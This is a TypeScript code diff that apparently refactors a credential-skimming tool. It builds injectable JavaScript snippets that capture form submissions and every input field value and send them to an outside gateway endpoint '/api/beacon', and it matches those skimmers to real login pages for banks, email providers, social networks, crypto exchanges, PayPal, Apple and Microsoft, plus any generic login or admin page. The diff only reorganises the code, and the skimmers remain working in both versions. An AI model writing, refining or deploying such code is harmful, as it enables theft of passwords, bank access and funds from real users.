@@ -50,61 +50,61 @@ type SiteProfile = {
   snippet: string;
 };
 
-function genericFormSnippet(gateway: string): string {
-  return `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,form:d})});});`;
-}
+// ── Static snippet templates (lazy-compute with gateway URL) ──
+type SnippetFn = (gateway: string) => string;
 
-function genericInputSnippet(gateway: string): string {
-  return `document.addEventListener('focusout',function(e){var t=e.target;if(t.tagName!=='INPUT'&&t.tagName!=='SELECT')return;fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,field:t.name||t.id||t.type,value:t.value})});});`;
-}
+const genericFormSnippet: SnippetFn = (g) =>
+  `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,form:d})});});`;
 
-function combinedSnippet(gateway: string): string {
-  return genericFormSnippet(gateway) + "\n" + genericInputSnippet(gateway);
-}
+const genericInputSnippet: SnippetFn = (g) =>
+  `document.addEventListener('focusout',function(e){var t=e.target;if(t.tagName!=='INPUT'&&t.tagName!=='SELECT')return;fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,field:t.name||t.id||t.type,value:t.value})});});`;
 
-function siteProfiles(gateway: string): Array<{ match: RegExp; profile: SiteProfile }> {
-  return [
-    // --- Gaming / Casino ---
-    { match: /shufflegaming|backoffice\.shuffle/i, profile: { name: "Shuffle Gaming backoffice", snippet: `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'shuffle',url:location.href,data:d})});});` } },
-    { match: /joe\.casino|joecasino/i, profile: { name: "Joe Casino", snippet: combinedSnippet(gateway) } },
-    { match: /\bjoe\b.*casino|casino.*\bjoe\b/i, profile: { name: "Casino (joe)", snippet: combinedSnippet(gateway) } },
-    { match: /anz/i, profile: { name: "ANZ", snippet: combinedSnippet(gateway) } },
-    // --- Banking ---
-    { match: /nab\.com\.au|netbank|commbank|westpac|anz\.com/i, profile: { name: "Banking portal", snippet: combinedSnippet(gateway) } },
-    // --- Social ---
-    { match: /facebook\.com|fb\.com/i, profile: { name: "Facebook", snippet: `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'fb',url:location.href,data:d})});});` } },
-    { match: /instagram\.com/i, profile: { name: "Instagram", snippet: combinedSnippet(gateway) } },
-    { match: /tiktok\.com/i, profile: { name: "TikTok", snippet: combinedSnippet(gateway) } },
-    { match: /twitter\.com|x\.com/i, profile: { name: "X / Twitter", snippet: combinedSnippet(gateway) } },
-    { match: /linkedin\.com/i, profile: { name: "LinkedIn", snippet: combinedSnippet(gateway) } },
-    // --- Email ---
-    { match: /gmail\.com|mail\.google/i, profile: { name: "Gmail", snippet: combinedSnippet(gateway) } },
-    { match: /outlook\.com|live\.com|hotmail/i, profile: { name: "Outlook", snippet: combinedSnippet(gateway) } },
-    // --- Shopping ---
-    { match: /shopify\.com|myshopify/i, profile: { name: "Shopify", snippet: combinedSnippet(gateway) } },
-    { match: /amazon\.com|amazon\.com\.au/i, profile: { name: "Amazon", snippet: combinedSnippet(gateway) } },
-    { match: /ebay\.com|ebay\.com\.au/i, profile: { name: "eBay", snippet: combinedSnippet(gateway) } },
-    // --- Crypto ---
-    { match: /binance\.com/i, profile: { name: "Binance", snippet: combinedSnippet(gateway) } },
-    { match: /coinbase\.com/i, profile: { name: "Coinbase", snippet: combinedSnippet(gateway) } },
-    { match: /kraken\.com/i, profile: { name: "Kraken", snippet: combinedSnippet(gateway) } },
-    // --- Google ---
-    { match: /accounts\.google|google\.com\/signin/i, profile: { name: "Google login", snippet: combinedSnippet(gateway) } },
-    // --- Apple ---
-    { match: /appleid\.apple|idmsa\.apple/i, profile: { name: "Apple ID", snippet: combinedSnippet(gateway) } },
-    // --- Microsoft ---
-    { match: /login\.microsoft|login\.live|microsoftonline/i, profile: { name: "Microsoft login", snippet: combinedSnippet(gateway) } },
-    // --- PayPal ---
-    { match: /paypal\.com/i, profile: { name: "PayPal", snippet: combinedSnippet(gateway) } },
-    // --- Generic login page patterns ---
-    { match: /login|signin|auth|sso|account|portal|backoffice|admin/i, profile: { name: "Login portal (generic)", snippet: combinedSnippet(gateway) } },
-  ];
-}
+const combinedSnippet: SnippetFn = (g) => genericFormSnippet(g) + "\n" + genericInputSnippet(g);
+
+// ── Static site profile catalogue (regexes compiled once at module load) ──
+type ProfileEntry = { match: RegExp; profile: { name: string; snippet: SnippetFn } };
+
+const SITE_PROFILES: ProfileEntry[] = [
+  // Gaming / Casino
+  { match: /shufflegaming|backoffice\.shuffle/i, profile: { name: "Shuffle Gaming backoffice", snippet: (g) => `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'shuffle',url:location.href,data:d})});});` } },
+  { match: /joe\.casino|joecasino/i, profile: { name: "Joe Casino", snippet: combinedSnippet } },
+  { match: /\bjoe\b.*casino|casino.*\bjoe\b/i, profile: { name: "Casino (joe)", snippet: combinedSnippet } },
+  { match: /anz/i, profile: { name: "ANZ", snippet: combinedSnippet } },
+  // Banking
+  { match: /nab\.com\.au|netbank|commbank|westpac|anz\.com/i, profile: { name: "Banking portal", snippet: combinedSnippet } },
+  // Social
+  { match: /facebook\.com|fb\.com/i, profile: { name: "Facebook", snippet: (g) => `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'fb',url:location.href,data:d})});});` } },
+  { match: /instagram\.com/i, profile: { name: "Instagram", snippet: combinedSnippet } },
+  { match: /tiktok\.com/i, profile: { name: "TikTok", snippet: combinedSnippet } },
+  { match: /twitter\.com|x\.com/i, profile: { name: "X / Twitter", snippet: combinedSnippet } },
+  { match: /linkedin\.com/i, profile: { name: "LinkedIn", snippet: combinedSnippet } },
+  // Email
+  { match: /gmail\.com|mail\.google/i, profile: { name: "Gmail", snippet: combinedSnippet } },
+  { match: /outlook\.com|live\.com|hotmail/i, profile: { name: "Outlook", snippet: combinedSnippet } },
+  // Shopping
+  { match: /shopify\.com|myshopify/i, profile: { name: "Shopify", snippet: combinedSnippet } },
+  { match: /amazon\.com|amazon\.com\.au/i, profile: { name: "Amazon", snippet: combinedSnippet } },
+  { match: /ebay\.com|ebay\.com\.au/i, profile: { name: "eBay", snippet: combinedSnippet } },
+  // Crypto
+  { match: /binance\.com/i, profile: { name: "Binance", snippet: combinedSnippet } },
+  { match: /coinbase\.com/i, profile: { name: "Coinbase", snippet: combinedSnippet } },
+  { match: /kraken\.com/i, profile: { name: "Kraken", snippet: combinedSnippet } },
+  // Google
+  { match: /accounts\.google|google\.com\/signin/i, profile: { name: "Google login", snippet: combinedSnippet } },
+  // Apple
+  { match: /appleid\.apple|idmsa\.apple/i, profile: { name: "Apple ID", snippet: combinedSnippet } },
+  // Microsoft
+  { match: /login\.microsoft|login\.live|microsoftonline/i, profile: { name: "Microsoft login", snippet: combinedSnippet } },
+  // PayPal
+  { match: /paypal\.com/i, profile: { name: "PayPal", snippet: combinedSnippet } },
+  // Generic login
+  { match: /login|signin|auth|sso|account|portal|backoffice|admin/i, profile: { name: "Login portal (generic)", snippet: combinedSnippet } },
+];
 
 function analyseTarget(targetUrl: string): SiteProfile {
   const gateway = getBaseUrl();
-  for (const { match, profile } of siteProfiles(gateway)) {
-    if (match.test(targetUrl)) return profile;
+  for (const { match, profile } of SITE_PROFILES) {
+    if (match.test(targetUrl)) return { name: profile.name, snippet: profile.snippet(gateway) };
   }
   return { name: "Generic site", snippet: genericFormSnippet(gateway) };
 }
